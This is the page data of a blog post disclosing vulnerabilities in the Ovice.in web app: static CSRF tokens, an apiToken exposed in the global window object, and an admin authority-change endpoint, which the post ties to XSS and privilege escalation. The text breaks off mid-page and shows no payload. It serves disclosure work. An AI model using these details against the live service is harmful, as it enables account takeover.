{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/Ovice.in-Picket-Static-Object-XSS-0-day-Vulnerability-Report/",
    "result": {"data":{"cur":{"id":"83b1f838-7acc-5d7b-b60a-0e055f937483","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACy0lEQVQoz02Sa2/bBBSG/cf4FfAB9nEIxkVFGohtoErrxNSmdM3VcZzGju06aePEyVo16yXZLYkXZ0kKa8UUNrIJJAS0yVbWe9aGB8UfEEc6es/tPedI5wiW6kcXJ7HUIHOxOFM3xkmKPgzJR1YNoEb9pFIZalWHVrNN2kyzkVN482uTpZSEHp3kx4c2/eePcCoVhPitCTIJP0ZslmgkinjrJkrgBqP4aIgUnEHTTO7dvY/rPmZ9rcSDO3nuFpKYsWmS4e/IqbPcXzZp1F0ETfGjqyKhkETWyiHLCnJUZNlWkGMyiUSSpaVliiurOE6dVmuTer2BlbEo5PMUV4rkrCxWJku14iAk1TBbWy1GcnR0xOD0lMFgwJvDvzk7O+Pg4IBer8f+/j4nJyde7u3bgVfPPzA8H3rm1pMn3LazCIvxGbbbdS84HJ572Ov1qdVc/vjzL7a3tygUCjSbTQaDU46Pj73GIxzp4eGhx3n601MW02mE8M0r/OBW+L+cnw85OT79b8PXe6/Z29uj3+97+OpV39t6d3eXnZ0dj9NubxIIBBGU2Pes3F70LujW6zTcBk6tiuOUaTYaPHYbNJst2q1NL9dwXbq/dOm+eEm3+4JO52eePXtOqVTGymQQdENC02SCwQjzxjxiJIqizGGaIpFwBCkqo2sGhm4Ql2WSqsaCmebq2Bi+iQky6RSKLDGvJ7HTGkLBiJAMTxKYuk5MkpDDAWqreXJqgMj0dYIzU1iZPHm7gK7ppMw0+ZzN5UsfceXzTynYNqX1NRqPKqwVFhDk2QkWE7Ns2CqSGGUuNMVCfJqIb5ySrWAmIvj9PmLhEJqqYejzlMv3GPvsE8a/vExx5Q6dTofff3uJU1pCGD21EvLx4cWPiYoy165+yzdffUE5F2f82tee/8F773Dx/XfRVB0tqfPwQRVDUbl04QIb6yVvQLVcpLpq8y8qx7BlOTi0qQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Ovice.in Unsafe XSS\"\n        title=\"Ovice.in Unsafe XSS\"\n        src=\"/static/4934dd2f52ce9a54db861043666c6f28/37523/sss-1.png\"\n        srcset=\"/static/4934dd2f52ce9a54db861043666c6f28/e9ff0/sss-1.png 180w,\n/static/4934dd2f52ce9a54db861043666c6f28/f21e7/sss-1.png 360w,\n/static/4934dd2f52ce9a54db861043666c6f28/37523/sss-1.png 720w,\n/static/4934dd2f52ce9a54db861043666c6f28/302a4/sss-1.png 1080w,\n/static/4934dd2f52ce9a54db861043666c6f28/07a9c/sss-1.png 1440w,\n/static/4934dd2f52ce9a54db861043666c6f28/29114/sss-1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"attack-type\" style=\"position:relative;\"><a href=\"#attack-type\" aria-label=\"attack type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Type</h2>\n<ul>\n<li>XSS</li>\n<li>Weak algorithm</li>\n<li>Hardcoded credentials</li>\n</ul>\n<h2 id=\"attack-effect\" style=\"position:relative;\"><a href=\"#attack-effect\" aria-label=\"attack effect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Effect</h2>\n<ul>\n<li>Security Check Bypass</li>\n<li>Privilege Escalation</li>\n</ul>\n<h2 id=\"found-location\" style=\"position:relative;\"><a href=\"#found-location\" aria-label=\"found location permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Found Location</h2>\n<ul>\n<li>It is a related page that proceeds with token management when logging in to the initial account.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token literal-property property\">https</span><span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>app<span class=\"token punctuation\">.</span>ovice<span class=\"token punctuation\">.</span>in<span class=\"token operator\">/</span>login\n<span class=\"token literal-property property\">https</span><span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>app<span class=\"token punctuation\">.</span>ovice<span class=\"token punctuation\">.</span>in<span class=\"token operator\">/</span>lobby</code></pre></div>\n<ul>\n<li>It can be seen that <code class=\"language-text\">apiToken</code> data of the App object, which is a window object sub-attribute, is managed.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\">window<span class=\"token punctuation\">.</span>App <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string-property property\">\"apiToken\"</span><span class=\"token operator\">:</span>apiToken<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\nwindow<span class=\"token punctuation\">.</span>socket <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></code></pre></div>\n<ul>\n<li>The <code class=\"language-text\">window.socket</code> object deals with the <code class=\"language-text\">boolean</code> data type, which is used as a branch to conduct socket communication suitable for the authority.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>workspaceUser<span class=\"token operator\">/</span>change<span class=\"token operator\">/</span>auth\n<span class=\"token literal-property property\">Cookie</span><span class=\"token operator\">:</span> ovice_session<span class=\"token punctuation\">,</span> <span class=\"token constant\">XSRF</span><span class=\"token operator\">-</span><span class=\"token constant\">TOKEN</span>\n<span class=\"token literal-property property\">Header</span><span class=\"token operator\">:</span> Authorization</code></pre></div>\n<ul>\n<li>Authority management for the user is performed, and the function operates in administrator authority.</li>\n</ul>\n<h2 id=\"attack-point\" style=\"position:relative;\"><a href=\"#attack-point\" aria-label=\"attack point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Point</h2>\n<h3 id=\"csrf-token-management\" style=\"position:relative;\"><a href=\"#csrf-token-management\" aria-label=\"csrf token management permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>csrf-token management</h3>\n<ul>\n<li>It can be seen that csrf-token is generated using the initial meta tag, and the token continues to remain at the same value.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA10lEQVQY0zXN0XKCMBCFYZ5EwYSEhQQhhIwoai3t+79R/g52vPhm91yc3aKdH8xjzNE5ZLiQ+p7FCXMnDCK0xiK1odsZi1KGQ6k4loqy2umPvM/CLVsO6c5z6IhxIaYbt96RfMc6embXElxHpcy7WFWa02lXcyj1+/jnwbFUuXDzjSGkvJ5bJu+w50T0juSEszSM7b9BLKNYpj2LpW8stjbUSmN0jT7pfc/F1/2Xn8uatymyTgvX6corzHyPgccQeI2BLQSWPlBbj0j/po1D5JM9tvG5aTx/osJ45MH7wqwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"CSRF TOKEN\"\n        title=\"CSRF TOKEN\"\n        src=\"/static/fd13408aec11a5cc5e83949618beec3b/37523/x_2.png\"\n        srcset=\"/static/fd13408aec11a5cc5e83949618beec3b/e9ff0/x_2.png 180w,\n/static/fd13408aec11a5cc5e83949618beec3b/f21e7/x_2.png 360w,\n/static/fd13408aec11a5cc5e83949618beec3b/37523/x_2.png 720w,\n/static/fd13408aec11a5cc5e83949618beec3b/2c5fd/x_2.png 1006w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"unsafe-token-management\" style=\"position:relative;\"><a href=\"#unsafe-token-management\" aria-label=\"unsafe token management permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unsafe token management.</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAADxElEQVQ4yy2Rz28UZRzG5z+QqJFg3d135p0f7zvzzu8f292d3bbbbhGKSGDYcFAgqCQGEg96MiaipJEKYoXU0hDRIDFevBiEGAQuXoF4MR5NZGjKNOKJPcDMY1o9fPJ8T5/keb4SD7r3mNdZC9oz9/3WdM68Ts79NBfRRG4Gad4gNCcqy02vmUcmzzXbyZmu57ZMc4uqOadGzhXtvibTNSrT36RO/5XigxOnML+wiI/mz+DDk6cx9fI+GF4KEfdgWg5M4SJKp9FvteGlEVrjMaaCEL0oxkQYohdGiD0frhv8LR0+fOzBhZUrWFq+/HTl4nflN5d/KI8cOV4yEZdukJbCDUvXtsswaJbtMCpbvl9GrleGnlc6flKGflD6jvvUtl1Ywl2T2unsw/7O/ZieG2Jm1xDTu4ZI4glw10XY9TEubDQ5xzjncA0OqnEQykAUHUQxICsGGkRFrS5vsC7t3n3gzzNnl54snlt5/Pm55dHi+ZXRnlcPjHTLG3lRNHI1feQbfBSaYsQ1Y9SQtVGDKJuQTeiIyOpjWVafEFn9S9ox2L3z6GtvDt9563i2wdsHj2aD/q5Mc7uZm8xmDY1nzxIj26aaGVHUjKhGVqd6VtOt7EXFyJ6vKdlz22rZC2P14dhLjZ1STdF/f2bLln+2jtUfsqBbML9bmGGv0J12MZjbV8zMDApNY0U37Rdz3bTY3m4Vg3an2N7pFIMkLqaisOj4QREK5xHn1h8SY2JdqdfBDBNRawZhs4+g2YfuttHfsRdpdxL1GkHgjaPnBYgtAd+yITQDFtUgVH3z5qoBheqPpCuXv1/9+cZtXLv+S/nTtRvVrdu/VqcXFivComowl1WdtFdt3TZWKcypTDeubMYr2RBVjdCq1qD/JaFlnVA0CF2T5k9+uvrl8lf47OxSeWphERcuXMJ7774PajUxObsH460UtbE6NObAckK4nIEaJohMQWQVNUJRI0pVIwoaRHko1fVg1bAS7N9/sHzjyDGk3e1QzAR2PAkRTYCJBHbkw2s7iE0HiSmQmDYS00IiXPjchmdYlW9YoKq5Lulue3Vv9jru3rlX3rx5C8tLF0F4BCfZEE5CFxEsv4lmHKHlOIgtB01LQHAXhmKAUQNMZRVXGRTK1iXFaq5mw0O4c/de+ePVq/j60reo6wGcZAoinoRu+lB0E3bQRs+3ETo2OOMbD9is3FA01Amt/t9wXeJ++mA8ncXHJz4pz3+xjOHwEAy3vVl3U2iFaNQJNDtC7Ido2SYE4xDCBRceqMY2xNWGnMjq+r/wVckUWSkA1wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"csrf token unsafe\"\n        title=\"csrf token unsafe\"\n        src=\"/static/0d85c9afdc781a71dc9d5cb39c6814ed/37523/csrf-token-unsafe.png\"\n        srcset=\"/static/0d85c9afdc781a71dc9d5cb39c6814ed/e9ff0/csrf-token-unsafe.png 180w,\n/static/0d85c9afdc781a71dc9d5cb39c6814ed/f21e7/csrf-token-unsafe.png 360w,\n/static/0d85c9afdc781a71dc9d5cb39c6814ed/37523/csrf-token-unsafe.png 720w,\n/static/0d85c9afdc781a71dc9d5cb39c6814ed/302a4/csrf-token-unsafe.png 1080w,\n/static/0d85c9afdc781a71dc9d5cb39c6814ed/e0202/csrf-token-unsafe.png 1395w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Log in process based on <code class=\"language-text\">XSRF-TOKEN</code> value, ID, and PW information.</li>\n<li>The <code class=\"language-text\">apiToken</code> generated after completion of the login process is used to verify user rights within the entire service.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVUlEQVQY01WKu07jQBhG/QrQJI6D5x+Px9dxTEI2koFwlRCCXS7ZLQIFvFHeJQ0pKDZsyxZpoWcKRgiJFkYfIqKA4uhIR8e5uLh8Hg7PzMbmlvGavml4TVOru6buNgxxYVSmTJ4rU1WVidPMLPlkFhYWTa328XjGdb2566736Da8F2c6neLu7h63t/+xt7ePXq+CUiXiJIdSy2gVbWxs7uJseI71tT66Kz+gihJZViBNcsgohYyzuaM4g3Nz8w8PWr/NZjO7s71ru2XHlmXHpssdGye5JY/ZXJX2+GRgu+2uVWlhs7JjE9WyEQ+tzwLLSHzwyiiAM7maYDweYzQaYa2/hUgmEFxCighhIMF8jqLVxuHPI8goA5EA+RzEAhAXIB5+w/l7PXkc/P6jTwcDXa32NfFQMxLaJ6EZD3VziXTRauuDw186lImmQM47+/y+8MBIPL0D41ujybN8HwIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unsafe-token\"\n        title=\"unsafe-token\"\n        src=\"/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/37523/unsafe-token.png\"\n        srcset=\"/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/e9ff0/unsafe-token.png 180w,\n/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/f21e7/unsafe-token.png 360w,\n/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/37523/unsafe-token.png 720w,\n/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/302a4/unsafe-token.png 1080w,\n/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/07a9c/unsafe-token.png 1440w,\n/static/ce0a2837cd0b1f3d712db4a2d8a1b5a5/7de21/unsafe-token.png 1839w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>After entering the workspace, it can be confirmed that the <code class=\"language-text\">apiToken</code> is in the Global Window object.</li>\n<li>Even if you enter a different workspace with the same account, you use the same value for the <code class=\"language-text\">apiToken</code></li>\n</ul>\n<h1 id=\"vulnerability-description\" style=\"position:relative;\"><a href=\"#vulnerability-description\" aria-label=\"vulnerability description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Description</h1>\n<h3 id=\"unsafe-token-management-1\" style=\"position:relative;\"><a href=\"#unsafe-token-management-1\" aria-label=\"unsafe token management 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unsafe token management.</h3>\n<ul>\n<li>Token is generated using a meta tag to defend <code class=\"language-text\">CSRF</code>.</li>\n<li>The <code class=\"language-text\">CSRF Token</code> value is input as a hidden field of the form tag of HTML and may be used as a dynamic request.</li>\n<li>In the <code class=\"language-text\">app.js</code> source code, you can check the case of inserting <code class=\"language-text\">csrf-token</code> into the Html tag and the logic of dynamically requesting it.</li>\n<li>The security provided by <code class=\"language-text\">CSRF Token</code> presupposes that the token is not known by the attacker, so care should be taken not to expose it to third parties through other channels.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXUlEQVQoz33SvY4cRRDA8RE5AU7RTn/VR093z0zPzs7umjN7RpfyACSLxAPwBjwBhGYCRMILABmZAwdkFhESoVeARIgcmpvtQrc6wE4IfvqrShVWlVL/vEu9IPECREJMYiyKNiDagihzx/2f2/t+q7SrqqFJP21iK4nCkohLy1ySo9JYLgG4sKUCCgpqLKjhNfiPW9QgZPD71cpWVR7T87ROQh29or5ZePALD3wpZbzUD3zLmRbOvPiBFup5oQwLdrBQC6+g89Kvw3dvZayq1I6/UNOIBRBH+Cb8b2cR/nU3NylK6juJbbo0pPhD3myqKob1Z+j4K127L7Vys67vKTcrBfOqdnNduy+UgifW0mwMzMxxPlzfzFdX1/M47p/sdldf9/346dvvPHhQTbn9/dHQvxiDP7XMp8R0Sp5PLdNlRsBfa+2+sZZ+ntbdb9sunbL3pwB4QuNOq5W580LV9g+t4WXlBy/5YSfcs1BCoYHF7r1gR+I7EmpR3vXuxxrhr3ZoJGYWhU40gSh8U41OqsixTHlXhnYogVNBCwUtFnR4Rotnay6HT23Cl3kbpHsYzy7h2UQ4r4J7DVxUtbJinS/jZpApR8mxEfYs1mFRGsrdH1oNTxtDf+YUZBfCLVlcWONiFCyqdovRuNS1vai0cUUbkpw7WXdeAqMobWRVm3JPtHHPyKGsuyhjG2SMLAFQAL1cP76Rxx/cSIitcBOlUtqKc03JQ5Y+kGzHjRwOB1mvpzJt98tm2osD/nyl3Yfc8Cdt54+580dEOCL546P3D8f9/r3jdrv/eJp2H/0N99knMf/a61kAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unsafe-token-p1\"\n        title=\"unsafe-token-p1\"\n        src=\"/static/afcd4879a51eca42c27a6a7fc8dabb0c/37523/unsafe-token-p1.png\"\n        srcset=\"/static/afcd4879a51eca42c27a6a7fc8dabb0c/e9ff0/unsafe-token-p1.png 180w,\n/static/afcd4879a51eca42c27a6a7fc8dabb0c/f21e7/unsafe-token-p1.png 360w,\n/static/afcd4879a51eca42c27a6a7fc8dabb0c/37523/unsafe-token-p1.png 720w,\n/static/afcd4879a51eca42c27a6a7fc8dabb0c/302a4/unsafe-token-p1.png 1080w,\n/static/afcd4879a51eca42c27a6a7fc8dabb0c/07a9c/unsafe-token-p1.png 1440w,\n/static/afcd4879a51eca42c27a6a7fc8dabb0c/147d8/unsafe-token-p1.png 1465w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>It can be confirmed that <code class=\"language-text\">_token, email, password, timezone</code> data is transferred to POST while logging in (user authentication).</li>\n<li>The _token value is the same as <code class=\"language-text\">CSRF-token</code>, and it may be seen that CSRF is defended.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQoz12R6W6DMBCE8/6v1R9V1aqKWomE5gBf+CQG5yJUZSobgqKs9DFrkAbv7MLwamiUg2XVoAiBYwx5luN1ucZHVoK6M0zoYUIHE24Jfx3QdEAT9YH4foGxhvQYkqBkAi/vX8k021cg6gBqWnAXwN1xRtQniHrsVXNNP1sMY+GusQgVePvMsFwRrAsDpltUNswIM6ptOri2g207uNMv6vNfMsQjsbTU2Oc7bFYb7PIteMHASwZBOEQZe46KinSO3xSX0K4BqUwa+T7ufEMmJL5XOTYFxZ5wsEqDTrCJ1EsDriyUO0Boi4KKMcN57ClO6wN+qEYhDymnmJH0F9hjPy7jCR/1BoQeybCfTacNmbrBlhtIf06hR5S/QKesRlM/bfWZfyrIEuSkLoeHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"debug traffix token process\"\n        title=\"debug traffix token process\"\n        src=\"/static/287d4db833c87b1cbb801514a3f36694/37523/x_7.png\"\n        srcset=\"/static/287d4db833c87b1cbb801514a3f36694/e9ff0/x_7.png 180w,\n/static/287d4db833c87b1cbb801514a3f36694/f21e7/x_7.png 360w,\n/static/287d4db833c87b1cbb801514a3f36694/37523/x_7.png 720w,\n/static/287d4db833c87b1cbb801514a3f36694/302a4/x_7.png 1080w,\n/static/287d4db833c87b1cbb801514a3f36694/b4cdf/x_7.png 1417w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>You can see that <code class=\"language-text\">apiToken</code> is assigned as an App object in the window.</li>\n<li>The <code class=\"language-text\">apiToken</code> verifies whether authorization is assigned to the user.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7ElEQVQoz5XRzU7DMBBF4bxJGyfx79hOnMShEl0gKgHv/z45iLBEBbr4NLu7mNOYa8Hc7L4Gy2INq9FsVpO1xnU9rtOc2p7zPzV53vZlmZlTpsbEFhNVEtEGggmI9sfg6aw4nbs/NSEWfBh3iRMxz0ylUkplnJbvWyo+JIwNWCdo4xm0u6sJITKWFckFLyNOMi4krI84L4ikQ5CMpAkX4jF8T/P+9kFdtn0eC+I8g9IMasB2ml4NP37UquFXze3ldV/TRCkbab0gz1dMrcS8YNrhoSBHlKfLleRk10pjtScYj+kNRvV0XzEeHPwEyCfNKzZf30UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"accessToken manage\"\n        title=\"accessToken manage\"\n        src=\"/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/37523/x_3.png\"\n        srcset=\"/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/e9ff0/x_3.png 180w,\n/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/f21e7/x_3.png 360w,\n/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/37523/x_3.png 